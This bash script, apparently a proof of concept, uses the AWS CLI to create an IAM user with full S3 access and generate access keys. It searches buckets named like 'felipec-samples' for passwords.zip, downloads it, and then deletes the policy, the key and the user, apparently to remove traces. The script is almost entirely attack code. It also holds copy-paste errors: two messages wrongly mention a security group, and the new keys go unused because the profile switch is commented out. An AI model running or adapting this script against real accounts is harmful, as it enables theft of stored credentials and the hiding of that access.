#!/bin/bash

# Set the policy details
policy_name="AmazonS3FullAccess"
policy_arn="arn:aws:iam::aws:policy/$policy_name"
user_name="poc"
download_dir="./downloads"

# Create a User
echo "Creating user..."
if aws iam create-user --user-name $user_name > /dev/null 2>&1; then
  echo "User $user_name created successfully"
else
  echo "Error creating user."
  exit 1
fi

# Attach policy to a user
echo "Attaching policy to user..."
if aws iam attach-user-policy --user-name $user_name --policy-arn $policy_arn > /dev/null 2>&1; then
  echo "Policy $policy_name attached successfully to the user $user_name"
else
  echo "Error creating security group."
  exit 1
fi

# Create access key for the IAM user and capture the output
output=$(aws iam create-access-key --user-name "$user_name")

# Extract Access Key ID and Secret Access Key from the output using jq (JSON processor)
ACCESS_KEY_ID=$(echo "$output" | jq -r '.AccessKey.AccessKeyId')
SECRET_ACCESS_KEY=$(echo "$output" | jq -r '.AccessKey.SecretAccessKey')

# # Change the AWS CLI profile to the newly created user
# aws configure set aws_access_key_id "$ACCESS_KEY_ID" --profile attacker
# aws configure set aws_secret_access_key "$SECRET_ACCESS_KEY" --profile attacker

# # Change profile
# aws configure set profile attacker

# List S3 buckets
echo "Listing S3 buckets..."
buckets=$(aws s3 ls | awk '{print $3}')

# Create download directory if it doesn't exist
mkdir -p $download_dir

# Iterate through each bucket
for bucket in $buckets; do
    # Check if the bucket name contains "felipec-samples"
    if [[ "$bucket" == *"felipec-samples"* ]]; then
        echo "Searching for passwords.zip in bucket: $bucket"
        
        # List objects in the bucket, recursively
        objects=$(aws s3 ls s3://"$bucket" --recursive)
        
        # Check if passwords.zip exists in the bucket
        if echo "$objects" | grep -q "passwords.zip"; then
            echo "passwords.zip found in bucket: $bucket"
            
            # Extract the file path
            file_path=$(echo "$objects" | grep "passwords.zip" | awk '{print $NF}')
            
            # Download passwords.zip
            aws s3 cp "s3://$bucket/$file_path" $download_dir/
            
            echo "passwords.zip downloaded from bucket: $bucket"
            break
        else
            echo "passwords.zip not found in bucket: $bucket"
        fi
    fi
done

# Detach policy from a user
echo "Detaching policy $policy_name from user $user_name..."
if aws iam detach-user-policy --user-name $user_name --policy-arn $policy_arn > /dev/null 2>&1; then
  echo "Policy $policy_name detached successfully from the user $user_name"
else
  echo "Error creating security group."
  exit 1
fi

# Delete access key for the IAM user
aws iam delete-access-key --user-name "$user_name" --access-key-id "$ACCESS_KEY_ID"

# Delete a user
echo "Deleting user $user_name..."
if aws iam delete-user --user-name $user_name > /dev/null 2>&1; then
  echo "User $user_name deleted successfully"
else
  echo "Error deleting user."
  exit 1
fi
